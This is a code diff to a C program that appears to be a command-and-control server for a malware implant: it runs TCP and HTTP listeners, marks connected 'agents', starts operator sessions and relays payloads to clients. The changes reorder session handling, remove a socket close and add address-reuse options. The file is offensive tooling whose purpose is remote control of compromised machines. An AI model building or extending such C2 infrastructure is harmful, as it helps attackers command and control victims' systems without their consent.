@@ -61,27 +61,23 @@ int main() {
             int http_listener_accept;
             char *executed;
 
-            //check if client session established
-            if (strcmp(input, "ok") == 0) {
-                puts("Session started");
-                puts("==========START SESSION==========");
-                session = 1;
-            }
-
             //check if operator want start HTTP listener
             if (strcmp(input, "http") == 0) {
                 //preparing listener
                 puts("Preparing HTTP listener");
                 http_listener_accept = http_listener(http_listener_socket);
                 
-                char agent_connected[] = "XXX-AGENT-REDGHOST-XXX";
-                if (send(inferno_accept, agent_connected, sizeof(agent_connected), 0) == -1)
-                    error("Error sending to client");
+                strcpy(input, "XXX-AGENT-REDGHOST-XXX");
 
                 //agent is connected to server
                 puts("Agent connected");
-                status = "ok";
-                strcpy(input, status);
+            }
+
+            //check if client session established
+            if (strcmp(input, "ok") == 0) {
+                puts("Session started");
+                puts("==========START SESSION==========");
+                session = 1;
             }
 
             //handle all client/agent communications
@@ -106,8 +102,6 @@ int main() {
                 printf("Sending to client: %s\n", response);
                 puts("===========END PAYLOAD===========\n");
             
-                // close HTTP accept
-                close(http_listener_accept);
             }
             //sending to client
             printf("Sending to client: %s\n", input);
@@ -144,6 +138,14 @@ int http_listener(int http_listener_socket) {
     http_listener_address.sin_addr.s_addr = inet_addr(IP);
     printf("HTTP listener initialized\n");
     
+    //reuse http
+    int reuse = 1;
+    if (setsockopt(http_listener_socket, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse)) == -1)
+        error("Error reusing http address");
+
+    if (setsockopt(http_listener_socket, SOL_SOCKET, SO_REUSEPORT, &reuse, sizeof(reuse)) == -1)
+        perror("Error reusing http port");
+
     //bind http
     printf("Binding http listener...\n");
     if (bind(http_listener_socket, (struct sockaddr *) &http_listener_address, sizeof(http_listener_address)) == -1)
@@ -186,6 +188,14 @@ void networking(int inferno_socket) {
     c2_address.sin_family = AF_INET;
     c2_address.sin_port = htons(PORT_TCP);
     c2_address.sin_addr.s_addr = inet_addr(IP);
+
+    //reuse tcp
+    int reuse = 1;
+    if (setsockopt(inferno_socket, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(int)) == -1)
+        error("Error reusing tcp address");
+
+    if (setsockopt(inferno_socket, SOL_SOCKET, SO_REUSEPORT, &reuse, sizeof(reuse)) == -1) 
+        perror("Error reusing tcp port");
 
     //bind tcp
     printf("Binding socket to c2 address...\n");
